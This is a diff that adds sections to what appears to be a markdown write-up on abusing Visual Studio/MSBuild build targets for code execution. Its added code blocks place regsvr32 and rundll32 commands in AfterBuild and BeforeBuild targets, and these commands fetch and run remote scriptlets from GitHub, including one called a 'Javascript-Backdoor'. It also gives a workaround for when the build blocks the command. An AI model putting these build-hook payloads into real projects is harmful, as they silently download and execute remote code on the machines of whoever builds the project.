@@ -83,15 +83,46 @@ Then,we made it.
 
 ![Alt text](http://static.wooyun.org/upload/image/201606/2016060310201433968.gif "gif1")
 
+####Use regsvr32.exe to run calc.exe
 
+Code:
 
+``` 
+<Target Name="AfterBuild">
+    <Exec Command="regsvr32.exe /u /s /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll"/>
+  </Target>
+``` 
 
+Console display error，but code execution success：
 
+![Alt text](http://static.wooyun.org/upload/image/201606/2016060310203144681.gif "gif1")
 
+####run jsrat:
 
+Code:
 
+``` 
+<Target Name="AfterBuild">
+    <Exec Command="rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)"/> 
+</Target>
+``` 
 
+The build blocked again.
 
+####Solution:
+
+Creat a js file to run jsrat.
+
+Code:
+
+``` 
+<Target Name="BeforeBuild">
+ <Exec Command="echo GetObject(&quot;script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test&quot;)>1.js"/> 
+  </Target>
+  <Target Name="AfterBuild">
+<Exec Command="1.js"/> 
+</Target>
+```
 
 
 
